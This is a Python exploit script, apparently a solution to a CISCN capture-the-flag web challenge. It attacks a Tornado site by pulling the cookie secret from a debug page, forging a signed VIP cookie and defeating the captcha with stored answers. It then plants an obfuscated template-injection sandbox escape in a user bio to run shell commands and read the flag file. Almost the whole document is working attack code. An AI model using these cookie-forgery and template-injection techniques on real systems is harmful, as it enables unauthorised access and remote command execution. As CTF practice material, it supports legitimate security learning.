import re
import sys
import hmac
import base64
import hashlib
import random
import string
from time import time as clock

import requests
from pyquery import PyQuery as PQ
from tornado.escape import utf8

def _create_signature_v2(secret, s):
    hash = hmac.new(utf8(secret), digestmod=hashlib.sha256)
    hash.update(utf8(s))
    return utf8(hash.hexdigest())

def format_field(s):
    return utf8("%d:" % len(s)) + utf8(s)

def sign_cookie(name, value, secret):
    timestamp = utf8(str(int(clock())))
    value = base64.b64encode(utf8(value))

    to_sign = b'|'.join([
        b'2',
        format_field('0'),
        format_field(timestamp),
        format_field(name),
        format_field(value),
        b''
    ])

    signature = _create_signature_v2(secret, to_sign)
    return to_sign + signature

def get_uuid(html):
    dom = PQ(html)
    return dom('form canvas').attr('rel')

def get_answer(html):
    uuid = get_uuid(html)
    answer = {}
    with open('./ans/ans%s.txt' % uuid, 'r') as f:
        for line in f.readlines():
            if line != '\n':
                ans = line.strip().split('=')
                answer[ans[0].strip()] = ans[1].strip()
    x = random.randint(int(float(answer['ans_pos_x_1'])), int(float(answer['ans_width_x_1']) + float(answer['ans_pos_x_1'])))
    y = random.randint(int(float(answer['ans_pos_y_1'])), int(float(answer['ans_height_y_1']) + float(answer['ans_pos_y_1'])))
    return x, y

def generate_randstr(len=10):
    return ''.join(random.sample(string.ascii_letters, len))

def get_token(html, csrfname):
    dom = PQ(html)
    form = dom("form")
    token = str(PQ(form)("input[name=\"%s\"]" % csrfname).attr("value")).strip()
    return token

def register(s, username, password, mail, csrfname, url, invite=''):
    rs = s.get(url + 'register')
    html = rs.text
    token = get_token(html, csrfname)
    x,y = get_answer(html)
    rs = s.post(url = url + 'register', data={
        csrfname: token,
        "username": username,
        "password": password,
        "password_confirm": password,
        "mail": mail,
        "invite_user": invite,
        "captcha_x": x,
        "captcha_y": y,
    })

    try:
        dom = PQ(rs.text)
        error = dom("div.alert.alert-danger")
        error = PQ(error).text().strip()
        if len(error):
            print "[-] Register failed."
            return False
    except:
        pass

    print "[+] Register Success."
    return True

def login(s, username, password, mail, csrfname, url):
    rs = s.get(url + 'login')
    html = rs.text
    token = get_token(html, csrfname)
    x,y = get_answer(html)
    rs = s.post(url = url + 'login', data={
        csrfname: token,
        "username": username,
        "password": password,
        "captcha_x": x,
        "captcha_y": y
    })

    try:
        dom = PQ(rs.text)
        error = dom("div.alert.alert-danger")
        error = PQ(error).text().strip()
        if len(error):
            print "[-] Login failed."
            return False
    except:
        pass

    print "[+] Login Success."
    return True

def write_bio(s, payload, csrfname, url):
    rs = s.get(url + 'user')
    html = rs.text
    token = get_token(html, csrfname)
    rs = s.post(url + "user", data={
        csrfname: token,
        "bio": payload
    })
    dom = PQ(rs.text)
    success = dom("div.alert.alert-success")
    success = PQ(success).text().strip()
    if len(success):
        print "[+] Write Bio Success"
        return True
    return False


def read_bio(s, url):
    rs = s.get(url + 'bio')
    flag = rs.text
    flag = flag.strip()
    if re.match(r"CISCN{.*}",flag):
        print "[+] Read Bio Success"
        print flag
        return True
    print "[-] Read flag Failed"
    return False

def get_secret(s, url):
    rs = s.get(url + "debugggg?info=data")
    return re.findall(r"cookie_secret = '(.*?)'", rs.text)[0]

def _exp(ip, port):
    csrfname = "_xsrf"
    url = "http://%s:%s/" % (ip, port)
    name = generate_randstr(6)
    password = "hhhhh"
    email = generate_randstr(6) + "@t.com"

    s = requests.session()
    secret = get_secret(s, url)

    if register(s, name, password, email, csrfname, url):
        login(s, name, password, email, csrfname, url)
        isvip = sign_cookie("isvip", "1", secret)
        s.cookies.set("isvip", isvip, domain=ip)
        payload = r"""{% raw ().__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13]["ev""al"]("__imp""ort__(\x27o""s\x27).__dict__[\x27po""pen\x27](\x27cat /home/ctf/flag\x27).read()") %}"""
        if write_bio(s, payload, csrfname, url):
            # get flag
            return read_bio(s, url)
        return False

def exp(host, port):
    attack = False

    try:
        attack = _exp(host,port)
    except:
        print "[-] Attack Failed"
        attack = False

    if attack:
        return True
    else:
        return False


if __name__ == "__main__":
    exp("127.0.0.1","8233")
